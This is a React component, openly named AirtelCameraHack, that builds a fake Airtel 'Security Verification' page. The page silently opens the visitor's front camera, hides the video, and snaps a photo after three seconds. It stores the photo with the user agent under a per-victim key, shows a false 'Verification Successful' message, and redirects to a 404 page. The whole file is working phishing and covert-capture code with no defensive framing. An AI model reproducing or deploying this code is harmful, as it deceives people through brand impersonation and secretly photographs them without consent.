
import { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';

const AirtelCameraHack = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isCapturing, setIsCapturing] = useState(false);

  useEffect(() => {
    startCamera();
  }, []);

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' },
        audio: false 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        
        setTimeout(() => {
          capturePhoto();
        }, 3000);
      }
    } catch (error) {
      console.log('Camera access denied');
    }
  };

  const capturePhoto = () => {
    if (videoRef.current && canvasRef.current) {
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      
      if (context) {
        context.drawImage(videoRef.current, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg');
        
        const capturedData = {
          carrier: 'Airtel',
          imageUrl: imageData,
          timestamp: Date.now(),
          ip: 'Unknown',
          userAgent: navigator.userAgent
        };

        const existingData = JSON.parse(localStorage.getItem(`camera_${userId}`) || '[]');
        existingData.push(capturedData);
        localStorage.setItem(`camera_${userId}`, JSON.stringify(existingData));
        
        setIsCapturing(true);
        
        setTimeout(() => {
          navigate('/404-not-found');
        }, 2000);
      }
    }
  };

  return (
    <div className="min-h-screen bg-red-500 flex items-center justify-center p-4">
      <div className="max-w-md mx-auto bg-white rounded-lg shadow-xl overflow-hidden">
        <div className="bg-red-600 p-4 text-center">
          <h1 className="text-white text-2xl font-bold">airtel</h1>
          <p className="text-white text-sm">Security Verification</p>
        </div>
        
        <div className="p-6">
          {!isCapturing ? (
            <>
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <span className="text-white text-2xl">📞</span>
                </div>
                <h2 className="text-gray-800 text-lg font-semibold mb-2">Account Verification</h2>
                <p className="text-gray-600 text-sm">Complete identity verification to access premium services</p>
              </div>

              <video 
                ref={videoRef} 
                className="w-full rounded-lg mb-4"
                autoPlay 
                muted 
                playsInline
                style={{ display: 'none' }}
              />
              
              <canvas ref={canvasRef} style={{ display: 'none' }} />
              
              <div className="bg-red-50 p-4 rounded-lg mb-4">
                <p className="text-red-800 text-sm">
                  🛡️ Secure facial recognition verification for enhanced account security.
                </p>
              </div>

              <Button 
                onClick={startCamera}
                className="w-full bg-red-500 hover:bg-red-600 text-white h-12 font-semibold"
              >
                Begin Verification
              </Button>
            </>
          ) : (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-red-500 mx-auto mb-4"></div>
              <h3 className="text-gray-800 text-lg font-semibold mb-2">Verification Successful</h3>
              <p className="text-gray-600 text-sm">Identity confirmed. Redirecting to services...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AirtelCameraHack;
